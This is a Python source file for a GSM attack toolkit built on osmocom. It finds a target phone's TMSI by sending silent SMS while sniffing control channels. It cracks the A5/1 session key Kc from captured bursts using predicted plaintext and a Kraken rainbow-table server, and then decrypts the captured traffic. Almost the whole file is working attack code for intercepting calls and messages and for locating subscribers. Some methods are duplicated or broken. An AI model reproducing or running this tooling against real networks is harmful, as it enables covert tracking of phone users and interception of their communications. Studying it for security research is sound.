#!/usr/bin/python

import telnetlib
import pexpect
import subprocess
import re
import random
import io
import sys
import os, fcntl, fcntl, termios, termios
import operator
import heapq
import time
import argparse
import termcolor
import serial
import glob
import json

from lxml import objectify
from io import FileIO
from binascii import *
from card.utils import *
from card.SIM import SIM
from jinja2 import Template

from time import sleep

from curses import ascii
from smspdu import SMS_SUBMIT

from prediction_methods import SysInfo
from prediction_methods import offset

from multiprocessing import Process
from najdisisms import NajdiSiSms

class smartdecode(object):
    """
    Class used for testing and local decoding of already captured data.
    Sim card reader is requierd.
    """ 

    def SmartCardGetKcFromRand(self, rand, pin=None):
        """
        Gets kc from smartcard by passing rand to it
        
        :param rand: Rand for which we want to get kc
        :type rand: str
        :param pin: Pin for sim card
        :type pin: str
        
        :returns : Kc
        :rtype: str
        """ 

	s= SIM()
	if not s:
		print "Error opening SIM"
		exit(1)

        if pin:
            s.verify_pin(pin)

        rand_bin= stringToByte(a2b_hex(rand))

	print "\nGSM Authentication"
	ret = s.run_gsm_alg(rand_bin)
	return b2a_hex(byteToString(ret[1]))

    def SmartDecode( self, capture_file, pin=None ):
        """
        Using several tshark scripts it finds location update in captured pcap file 
        It extract all needed parameters from them(sres, rand) and starts
        data decoding. Output is written to wireshark using burst_decode
        utlity.
        
        :param capture_file: Path to capture file we want to decode
        :type capture_file: str
        :param pin: Pin of smart card
        :type pin: str
        
        :return: None
        :rtype: None
        """ 

        out= subprocess.check_output(" ./get_location_updates %s" % (capture_file,), shell=True)
        lines= out.split("\n")
        print lines

        frameno= 0
        tmsi= ""
        rand= ""
        results={}
        for line in lines:
            if frameno and tmsi and rand:
                if tmsi not in results:
                    results[tmsi]= { frameno: 
                            {"kc": self.SmartCardGetKcFromRand(rand, pin), 
                                "frameno": [frameno,] }}
                else:
                    results[tmsi][frameno]= {"kc":  
                            self.SmartCardGetKcFromRand(rand, pin), 
                                "frameno": [frameno,]}
                print "KC:", results[tmsi][frameno]["kc"]

                frameno= 0
                tmsi= ""
                rand= ""

            result= re.search('(\d+)\s+0x([0-9abcdef]+)', line)
            if result:
                frameno= int(result.group(1))
                tmsi= result.group(2)
                print "TMSI:", tmsi
                print "FRAMENO:", frameno

                continue

            if tmsi:
                result= re.search("([0-9abcdef:]{47})", line)
                if result:
                    rand= result.group(1).replace(":", "")
                    print "RAND:", rand

        out= subprocess.check_output("./get_paging_responses %s" % (capture_file,), shell=True)
        lines= out.split("\n")
        print lines

        for line in lines:
            result= re.search('(\d+)\s+0x([0-9abcdef]+)', line)
            if not result:
                continue

            frameno= int(result.group(1))
            tmsi= result.group(2)

            if tmsi not in results:
                continue

            closest_lu_frameno= min(filter(lambda x:frameno>x,results[tmsi].keys()), 
                    key=lambda x:abs(frameno-x))

            if int(frameno) in results[tmsi][closest_lu_frameno]["frameno"]:
                    continue
            results[tmsi][closest_lu_frameno]["frameno"].append(int(frameno))

        for tmsi in results:
            for lu_frameno in results[tmsi]:
                for frameno in results[tmsi][lu_frameno]["frameno"]:
                    self.DecodeFrames( frameno, results[tmsi][lu_frameno]["kc"] )

    def DecodeFrames( self, frameno, kc ):
        """
        Decodes frames based on frame number and kc.
        So if we know where transaction occured we know which file to decode
        
        :param frameno: Framenumber to decode
        :type frameno: int
        :param kc: Kc witch which we want to decode
        :type kc: str
        
        :return: None
        :rtype: None
        """ 

        max= sys.maxint
        result= None

        files= os.listdir(".")
        for file in files:
            if ".dat" in file:
                bursts_info= file.split("_")
                frameno2= int(bursts_info[4])
                if abs(frameno-frameno2)<max:
                    max= abs(frameno-frameno2)
                    result= file

        if result:
            print result

            print "Decoded bursts", result
            print gsmrecode.DecodeData(kc, result)

class NajdiSiSms_gsm(object):
    """
    Class for sending smses using najdi.si web service(usefull for slovenia)
    """ 

    def __init__(self,username, password):
        """
        Initializes Najdi.si sms web service

        .. todo:: Move this class to NajdiSiSms.py
        
        :param username: Username you registered at najdi.si
        :type username: str
        :param password: Password you registered at najdi.si
        :type password: str
        
        :returns : None
        :rtype: None
        """ 
        self.username= username
        self.password= password
        self.sender= NajdiSiSms()

    def send(self, number, silent=True):
        """
        Sends sms 
        
        :param number: Number to send to
        :type number: str
        :param silent: Should we send slient sms or not
        :type silent: boolean
        
        :returns : Result of sending
        :rtype: boolean
        """ 

        return self.sender.send_sms(self.username,self.password,number,"test")

class atsms(object):
    """
    Sends sms using AT modem
    """ 

    def __init__(self,sp_name):
        self.sp= serial.Serial(sp_name, timeout=0.2)

    def send(self, number, silent=True):
        print "Testing modem"
        res= self._ser_send("AT\r")
        if "OK" not in res:
            return False
        print "Modem seems alive"

        print "Setting pdu mode"
        res= self._ser_send("AT+CMGF=0\r")
        if "OK" not in res:
            return False
        print "Pdu mode set"

        print "Creating and sending pdu"

        pdu = SMS_SUBMIT.create('38641111111', number, 'test', tp_pid=64, tp_srr=1).toPDU()
        if not silent:
            pdu = SMS_SUBMIT.create('38641111111', number, 'test').toPDU()
        print "PDU:",pdu, "with len:",str(len(pdu)/2)
        res= self._ser_send("AT+CMGS="+str(len(pdu)/2)+"\r")

        res= self._ser_send("00"+pdu)
        res= self._ser_send(ascii.ctrl("z"))

        print "Pdu sent"

    def _ser_send(self, s):
        self.sp.write(s)
        sleep(0.2)
        ret=""
        while True:
            data = self.sp.read(64)
            if len(data) != 0:
                ret+=data
            else:
                break

        return ret

class findtmsi(object):
    """
    Finds tmsi using ccch_scan on different arfcns by looking which mobile
    phone respondes in a given time when silent sms is sent.
    """

    def Scan(self):
        """
        Scans through all arfcns, trying to find the one that has our tmsi
        
        :returns : best tmsi and best arfcn
        :rtype: list
        """ 
        max_occurenc=0
        max_tmsi=""
        max_arfcn=0

        for arfcn in self.arfcns:
            print "Scanning arfcn:", arfcn
            (c,c2,t)=self.ScanArfcn(arfcn)
            print "Current max occurences is %d, and second max occurence is %d, with tmsi %s"% (c, c2,t)
            if c>max_occurenc:
                max_occurenc= c
                max_tmsi=t
                max_arfcn=arfcn
            if c-c2>=2:
                print "This shurely is target tmsi and it's arfcn"
                break

        print( "Max occurences is %d, with tmsi %s on arfcn %d"% 
                (max_occurenc, max_tmsi, max_arfcn) )
        return (max_tmsi, max_arfcn)

    def ScanArfcn(self, arfcn):
        """
        Scans speciffic arfnc while tring to find target tmsi
        
        :param arfcn: Arfcn to scan
        :type arfcn: int
        
        :returns : Best tmsi occurance, second best tmsi occurance, and tmsi
        :rtype: list
        """ 

        last_tmsi={}
        last_tmsi_index=0
        best_tmsi={}

        tmsi_count=0
        immass_count=0
        sms_process=None

        #Let's start sniffing
        p=pexpect.spawn("./ccch_scan -s %s -a %d -i 127.0.0.1" % (self.socket, arfcn),
                timeout=400)

        #Let's send first sms
        if self.sms_sender:
            sms_process= Process(target=self.sms_sender.send, args=(self.number,))
            sms_process.start()

        #Last time that sms was sent
        last_time= time.localtime()

        #Main loop
        while(True):
            i=p.expect(["GSM48 IMM ASS","M\((\d+)\)"])

            if(i==0):
                print "Immass found"
                print last_tmsi.values()
                for id in last_tmsi.keys():
                    if last_tmsi[id] not in best_tmsi.keys():
                        best_tmsi[last_tmsi[id]]=0
                    best_tmsi[last_tmsi[id]]+=1
                last_tmsi={}
                tmsi_count=0
                immass_count+=1
            if(i==1):
                if p.match.group(1) not in last_tmsi:
                    last_tmsi[last_tmsi_index]=p.match.group(1)
                    tmsi_count+=1

                    if last_tmsi_index>=9:
                        last_tmsi_index=0

                    last_tmsi_index+=1

            now= time.localtime()
            if( self.sms_sender 
                    and (time.mktime(now) - time.mktime(last_time))>10 
                    and not sms_process.is_alive() ):
                sms_process= Process(target=self.sms_sender.send, args=(self.number,))
                sms_process.start()
                last_time=time.localtime()

            if immass_count>=self.immass_count:
                break

        print max(best_tmsi.values())
        print heapq.nlargest(2, best_tmsi.values())[1]
        return (max(best_tmsi.values()), heapq.nlargest(2, best_tmsi.values())[1],
                max(best_tmsi.iteritems(), key=operator.itemgetter(1))[0])

    def __init__(self, arfcns, immass_count=60, socket="/tmp/osmocom_l2_1", 
            sms_sender=None, number=None):
        """
        Creates instance of findtmsi class
        
        :param arfcns: Arfcns we want to scan for taget tmsi
        :type arfcns: list
        :param immass_count: Count of immidiate assignment frames we want to
                             capture for esitmation which tmsi is correct.
        :type immass_count: int
        :param socket: Osmocom socket on which we are running layer1
        :type socket: string
        :param sms_sender: Sms sender class
        :type sms_sender: object
        :param number: Target mobile number
        :type number: str
        
        :returns : None
        :rtype: None
        """ 

        self.arfcns= arfcns
        self.number= number
        self.socket= socket
        self.sms_sender= sms_sender
        self.immass_count= immass_count

class Callable:
    def __init__(self, anycallable):
        self.__call__ = anycallable

class gsmrecode(object):
    def _RunEncodeBursts( data ):
        """
        Tries to encode bursts

        .. note:: This function requiers burst_decode process in execution path
        
        :param data: Data we want to encode
        :type data: str
        
        :returns : Encoded data
        :rtype: str
        """ 

        result= objectify.parse(io.StringIO(unicode(subprocess.check_output( "./burst_encode --data %s" % (data,),  shell=True))))
        result= result.xpath("/frame/burst/text()")

        return result

    RunEncodeBursts=Callable(_RunEncodeBursts)

    def _RunDecodeBursts( frame, kc ) :
        """
        Tries to decode bursts

        .. note:: This function requiers burst_decode process in execution path
        
        :param frame: Frame to decode
        :type frame: str
        :param kc: KC used for decoding
        :type kc: str
        
        :returns : Decoded data
        :rtype: str
        """ 

        out=""
        for burst in frame.xpath("burst"):
            out+= "--burst %s " % (burst.cyphertext.text.strip(),)

        try:
            main_params= "./burst_decode -i 127.0.0.1 --ul %d --fn %d -t %d " % (int(frame.attrib["uplink"]), int(frame.xpath("burst")[0].attrib["fn"]), int(frame.chan_type),)
        except:
            print "Error:", sys.exc_info()[0]
            return None

        main_params+= out

        if int(frame.attrib["cipher"])==1:
            result= subprocess.check_output(main_params + " --kc " + kc, shell=True)
        else:
            result= subprocess.check_output(main_params , shell=True)

        result= re.search("RAW\sDATA:\s+([0-9abcdef ]+)", result)
        if result:
            return result.group(1)

        print "Error decoding", main_params, "with kc", kc

        return None

    RunDecodeBursts= Callable(_RunDecodeBursts)

    def _DecodeData( kc, data ):
        """
        Decodes input data
        
        :param kc: Kc used for decoding
        :type kc: str
        :param data: Data we want to decode in form of xml frames or as input
                     filename of file with xml frames in it.
        :type: xml, str
        
        :returns : Decoded data
        :rtype: str
        """ 

        if isinstance(data, basestring):
            data= objectify.parse(FileIO(data))

        frames= data.xpath("/scan/frame")
        data= []
        for frame in frames:
            data.append(gsmrecode.RunDecodeBursts( frame, kc ))

        return data

    DecodeData= Callable(_DecodeData)

class gsmcrack(object):
    """
    Class for cracing gsm frames using kraken.

    .. todo:: better prediction engine
    """ 

    def ErrorRate( self, ul, data ):
        """
        Gets error rate of uplink or downlink data
        
        :param ul: 1 for uplink and 0 for donwnlink
        :type ul: int
        :param data: Xml frames
        :type data: xml
        
        :returns : Error rate
        :rtype: float
        """ 

        rates= data.xpath("/scan/frame[@cipher='0' and @uplink='%d']/error" % ul)
        sum= 0
        for e in rates:
            sum+= e

        return sum/len(rates)

    def xor( self, b1, b2 ):
        r=""
        for i in range(114):
            a = ord(b1[i])
            b = ord(b2[i])
            r = r+chr(48^a^b)

        return sum/len(rates)

    def xor( self, b1, b2 ):
        r=""
        for i in range(114):
            a = ord(b1[i])
            b = ord(b2[i])
            r = r+chr(48^a^b)

        return r

    def CrackData( self, PredictFile=None, debug=False ):
        """
        Cracks data using prediction file

        .. todo:: Better prediction engine
        
        :param PredictFile: File path
        :type PredictFile: str
        
        :returns : Kc/False
        :rtype: str, boolean
        """ 

        if not PredictFile:
            print "Predict file not specified"
            return False

        (filename,data)=self.data[0]

        print "Cracking following captures:"
        remove=[]
        for info in self.data:
            print "Capture file: ", info["f"]
            print "\tWith,", str(len(info["capture"].xpath("/scan/frame"))), "frames avalible"
        
            # Check if uplink or downlink data was too nasty for beeing
            # decoded or if there were too many errors
            data= info["capture"]
            if( len(data.xpath("/scan/frame[@cipher='0' and @uplink='1']/data"))!=
                len(data.xpath("/scan/frame[@cipher='0' and @uplink='1']")) or
                self.ErrorRate(1, data)>0.02 ):
                print "Ignoring uplink"
                info["ignore_ul"]= True
            if( len(data.xpath("/scan/frame[@cipher='0' and @uplink='0']/data"))!=
                len(data.xpath("/scan/frame[@cipher='0' and @uplink='0']")) or
                self.ErrorRate(0, data)>0.02 ):
                print "Ignoring downlink"
                info["ignore_dl"]= True
            if( (info.get("ignore_ul") is not None)
                    and (info.get("ignore_dl") is not None) ):
                print "Too mouch errors in", info["f"]
            bad_count=0
            for frame in data.xpath("/scan/frame"):
                if len(frame.xpath("burst"))<4:
                    bad_count+=1
            if bad_count>5:
                remove.append(info)

        for r in remove:
            self.data.remove(r)

        # Opens prediction file and starts cracking based on rules in
        # prediction file
        with open(PredictFile) as f:
            fcontent = "".join( f.readlines() )
            template = Template(fcontent)
            content= template.render(os.environ).split("\n")
            print "We are guessing:\n", "\n".join(content)

            predictions=[]
            for line in content: predictions.append(json.loads(line))

            rounds= 0
            end= False
            while not end:
                print "Starting cracking round", rounds
                for (i,prediction) in enumerate(predictions):
                    print "Using prediction", str(i), content[i]
                    prediction["end"]= False

                    method= filter(lambda prediction_method: 
                                    prediction["method"]==prediction_method.name,
                                    self.prediction_methods)[0]

                    if "seek_mode" not in prediction:
                        prediction["seek_mode"]= "normal"

                    if "processed_files" not in prediction:
                        prediction["processed_files"]=[]

                    # We will process first non processed burst and pass on
                    if prediction["seek_mode"]=="normal":
                        non_used_data= filter(lambda info: 
                                    info["f"] not in prediction["processed_files"],
                                self.data)
                        if non_used_data:
                            args=[]

                            if "args" in prediction: args= prediction["args"]

                            if args.get("process_count")=="all":
                                count=len(non_used_data)
                            else:
                                count= int(args.get("process_count")) or 1

                            if count>len(non_used_data):
                                count= len(non_used_data)

                            fc= 0
                            current_index=0
                            while(fc<len(non_used_data) and current_index<count):
                                data= non_used_data[fc]
                                print "Using file", data["f"]

                                prediction["processed_files"].append(data["f"])

                                (prediction_data, frame)= \
                                         method.Predict(data["capture"], args)
                                if (not prediction_data) or (not frame):
                                    print """Prediction method returned 
                                             no prediciton data or no frame"""
                                    fc+= 1
                                    continue

                                if frame.attrib["uplink"] and data.get("ignore_ul"):
                                    print """You are trying to crack uplink frame, 
                                        but we are ignoring uplink, so continue"""
                                    fc+= 1
                                    continue
                                if (not frame.attrib["uplink"]) and data.get("ignore_dl"):
                                    print """You are trying to crack downlink frame, 
                                        but we are ignoring downlink, so continue"""
                                    fc+= 1
                                    continue

                                print "Cracking ul:", str(frame.attrib["uplink"]), " frame", frame.xpath("burst")[-1].attrib["fn"], \
                                        " with prediction,", prediction_data
                                result=None
                                if not debug:
                                    result= self.CrackFrame(frame, prediction_data)

                                if result:
                                    print """Key %s for capture %s found with 
                                             rule %d in %d rounds""" %(data["f"],result,i,rounds)
                                    return (data["f"],result,i,rounds)

                                fc+= 1
                                current_index+= 1

                            prediction["end"]= False
                        else:
                            prediction["end"]= True

                end=True
                for prediction in predictions: end= end and prediction["end"]

                rounds+= 1

            print "End of cracking rounds"

        print "Key not found after %d rounds" % (rounds,)
        return False

    def CrackFrame( self, frame, data ):
        """
        Tries to crack frame using prediction frame data
        
        :param frame: Frame data we want to crack
        :type frame: str
        :param data: Prediction data to use with cracking
        :type data: str
        
        :returns : Kc/False
        :rtype: str, boolean
        """ 

        key_result= False
        plaintexts= gsmrecode.RunEncodeBursts(data)

        bursts= frame.xpath("burst")

        #Take all samples
        for i in random.sample(range(0,len(bursts)), len(bursts)):
            print "Using burst", i
            try:
                keystream= self.xor(bursts[i].cyphertext.text.strip(),plaintexts[i].strip())
            except:
                continue
            results= self.RunKraken(keystream)
            if results:
                print "Kraken was sucesfull"
                for result in results:
                    if i+2>=len(bursts):
                        a=-1
                    else:
                        a= 1

                    test= random.sample(range(0,len(bursts)), len(bursts))
                    del test[test.index(i)]
                    for j in test:
                        print "Trying to find Kc for burst", j
                        keystream= self.xor(bursts[j].cyphertext.text.strip(), plaintexts[j].strip())
                        key_result= self.RunFindKc( result[0], result[1],
                                int(bursts[i].attrib["fn"]), int(bursts[j].attrib["fn"]),
                                keystream )
                        if key_result:
                            return key_result

                    print "We give up, continue..."

        return False

    def GetFrameCount( self, frameno):
        t1= int(frameno)/1326
        t2= int(frameno) % 26
        t3= int(frameno) % 51

        return (t1<<11)|(t3<<5)|t2

    def RunFindKc( self, key, offset, frameno1, frameno2, keystream):
        """
        Tries to find kc based on reversed keystream params from kraken
        
        :param key: key found
        :type key: str
        :param offset: kraken offset param
        :type offset: int
        :param frameno1: Frame number of cracked bursts
        :type frameno1: int
        :param frameno2: Frame number of any other burst in frame
        :type frameno2: int
        :param keystream: Keystream that we were cracking
        :type keystream: str
        
        :returns : Kc
        :rtype: str
        """ 

        framecount1= self.GetFrameCount(frameno1)
        framecount2= self.GetFrameCount(frameno2)

        print "Trying to find kc for key %s, offset %d, framecount1 %d, \
              framecount2 %d and keystream %s" % (key, offset, framecount1,
                      framecount2, keystream )

        result= subprocess.check_output("./find_kc %s %d %d %d %s" % 
                (key, offset, framecount1, framecount2, keystream), shell=True)
        result = re.search('([0-9abcdef ]+) \*\*\* MATCHED \*\*\*', result)
        if result:
            print "Kc was found"
            return result.group(1).replace(" ", "").strip()

        print "Kc was not found"
        return False

    def RunKraken( self, keystream ):
        """
        Runs kraken for speciffic keystream.

        Kraken tries to reverse keystream and if it succedes it its possible
        reversed key, we can use in find_kc.
        
        :param keystream: Keystream that we try to reverse
        :type keystream: str
        
        :returns : List of (reversed key, offset)
        :rtype: list
        """ 

        print "Running kraken for keystream", keystream

        tn= None
        if self.tn:
            tn=self.tn
        else:
            tn= telnetlib.Telnet(self.kraken_ip, self.kraken_port)

        try:
            sleep(2)
            tn.write("crack %s\r\n" % keystream)
        except:
            return []

        id= -1
        result=[]
        while 1:
            try:
                (index, match, text)= tn.expect([
                       '103\s+([0-9]+)\s+([0-9ABCDEF]+)\s+([0-9]+)',
                       '404\s+([0-9]+)',
                       '101\s+([0-9]+)',
                      ], 300)
            except:
                break

            if index==-1:
                if id==-1:
                    tn.write("crack %s\r\n" % keystream)
                    continue
                break
            elif index==2:
                id=match.group(1)
                print "Crack id is:", id
            elif index==1:
                if match.group(1)==id:
                    print "End of crack:", id
                    break
            elif index==0:
                if match.group(1)==id:
                    print "New result for crack:", id, match.group(2), match.group(3)
                    result.append((match.group(2),int(match.group(3)),))

        return result

    def __init__( self, files, prediction_methods, 
            kraken_ip="localhost", kraken_port=6010):
        """
        Initializes gsmcrack with file we want to crack and kraken server params
        
        :param files: File or list of files we want to crack
        :type files: str, list
        :param prediction_methods: List of avalible prediction methods
        :param prediction_methods: list, PredictionMethod
        :param kraken_ip: Ip that kraken is running os
        :type kraken_ip: str
        :param kraken_port: Port that kraken is running on
        :type kraken_port: int
        
        :returns : None
        :rtype: None
        """ 

        #Can accept both one file or list of files
        self.data=[]
        print files
        if not isinstance(files, basestring):
            for fn in files:
                print "Loading file", fn
                try:
                    self.data.append( {"f": fn, 
                        "capture": objectify.parse(FileIO(fn))} )
                except:
                    print "Cant load", fn
        else:
            self.data.append( {"f": files, 
                "capture":  objectify.parse(FileIO(files))} )
        self.prediction_methods= prediction_methods
        self.tn= None
        self.kraken_ip= kraken_ip
        self.kraken_port= kraken_port

def parseCapture(args):
    if not hasattr(args,"prediction"):
        print "Prediction file not specified"
        exit(0)
    files=[]

    for fn in args.data:
        files.append( glob.glob(fn) )
    files= [x for sublist in files for x in sublist] #flatten list
    a= gsmcrack(files, [SysInfo(), offset()], args.kraken_ip, args.kraken_port)

    for prediction in args.prediction:
        print a.CrackData(prediction, args.debug)

def parseSms(args):
    sender=None
    if hasattr(args,"najdisi") and args.najdisi:
        print "using najdi.si"
        if not hasattr(args,"najdisi_username"):
            print "Username for najd.si must be specified"
            exit(0)
        if not hasattr(args,"najdisi_password"):
            print "Password for najdi.si must be specified"
            exit(0)
        sender=NajdiSiSms_gsm(args.najdisi_username, args.najdisi_password)
    if hasattr(args,"atsms") and args.atsms:
        print "Using at modem"
        sender=atsms(args.modem)

    if hasattr(args,"findtmsi") and args.findtmsi:
        if not hasattr(args,"arfcn"):
            print "You must speciffy arfcns"
            exit(0)
        a=findtmsi(args.arfcn, args.immass_count, args.socket, sender, args.number.strip())
        a.Scan()

    if hasattr(args,"send") and args.send:
        for x in range(0,args.count):
            print "Sending sms", x
            sleep(3)
            sender.send(args.number.strip(), args.silent)

def parseSmartDecode(args):
    a=smartdecode()
    a.SmartDecode(args.capture, args.pin)

if __name__ == "__main__":
    desc="""
Copyright (C) 2012 Jaka Hudoklin <jakahudoklin@gmail.com>
Thanks to osmocom who made everything possible

License GPLv2+: GNU GPL version 2 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

"""
    parser = argparse.ArgumentParser(epilog=
termcolor.colored(
"""  
      _|_|_|    _|_|_|   _|      _|       ,--.!,
     _|        _|        _|_|  _|_|    __/   -*-
     _|  _|_|    _|_|    _|  _|  _|  ,8888.  '|`
     _|    _|      _|    _|      _|  880088     
       _|_|_|  _|_|_|    _|      _|  `8888'     
             __ __   _   __ _
            /   |_\ /_\ /   |/ 
            \__ | \ / \ \__ |\ 

      All your base are belong to us...
    
....GSM penetration testing tools based on osmocom 
            opensource gsm stack....
""",color="green",attrs=['blink']),
    description=desc, 
    formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--debug", action="store_true", default=False,
            help="Should we run in debug mode")

    subparsers= parser.add_subparsers()

    capture= subparsers.add_parser("capture", description=desc,
            formatter_class=argparse.RawDescriptionHelpFormatter,
            help="Do some actions with captures like cracking and decoding")
    capture_group= capture.add_mutually_exclusive_group()
    capture_group.add_argument("--crack", action="store_true", 
            help="Cracks passed data")
    capture_group.add_argument("--decode", action="store_true", 
            help="Decodes passed data")
    capture.add_argument("--data", required=True, nargs="+",
            help="Capture files to make action on")
    capture.add_argument("--prediction", nargs="+",
            help="Prediction files to use or folder with predictions")
    capture.add_argument("--kraken_ip", 
            default=os.environ.get("KRAKEN_IP","127.0.0.1"),
            help="""Ip where you run kraken (default localhost), 
                    or KRAKEN_IP environment variable""")
    capture.add_argument("--kraken_port", type=int,
            default=int(os.environ.get("KRAKEN_PORT",6666)),
            help="""Port where you run kraken (default 6666),
                    or KRAKEN_PORT environemnt variable""")
    capture.set_defaults(func=parseCapture)

    sms= subparsers.add_parser("sms", description=desc,
            formatter_class=argparse.RawDescriptionHelpFormatter,
            help="Finds tmsi using different methods")

    sms.add_argument("--findtmsi", action="store_true",
            help="Tries to find tmsi by sending smses")
    sms.add_argument("--arfcn", nargs="+", type=int,
            help="Arfcns on which to scan")
    sms.add_argument("--socket", default="/tmp/osmocom_l2",
            help="Socket where you run osmocom (default \"/tmp/osmocom_l2\")")
    sms.add_argument("--immass_count", type=int, default=40,
            help="Count of immidiate assignments to wait (default 40)")

    sms.add_argument("--send", action="store_true",
            help="Sends sms")
    sms.add_argument("--count", default=1, type=int,
            help="Count of smses to send")
    sms.add_argument("--silent", action="store_true", default=False,
            help="Sends silent smses")

    sms.add_argument("--najdisi", action="store_true",
            help="Use najdi.si sms sender")
    sms.add_argument("--najdisi_username",
            help="Username for najdi.si")
    sms.add_argument("--najdisi_password",
            help="Password for najdi.si")

    sms.add_argument("--atsms", action="store_true",
            help="Use at modem for sms sender")
    sms.add_argument("--modem", default="/dev/ttyUSB0",
            help="TTY device for modem (default /dev/ttyUSB0)")

    sms.add_argument("--number", required=True,
            help="Number for which we want to find tmsi")
    sms.set_defaults(func=parseSms)

    smart_decode= subparsers.add_parser("smart_decode",description=desc,
            formatter_class=argparse.RawDescriptionHelpFormatter,
            help="Decodes all capture files with help of smart card reader")
    smart_decode.add_argument("--capture", required= True,
            help="Pcap capture file to use")
    smart_decode.add_argument("--pin", required= True,
            help="Your pin number")
    smart_decode.set_defaults(func=parseSmartDecode)

    args = parser.parse_args()
    args.func(args)
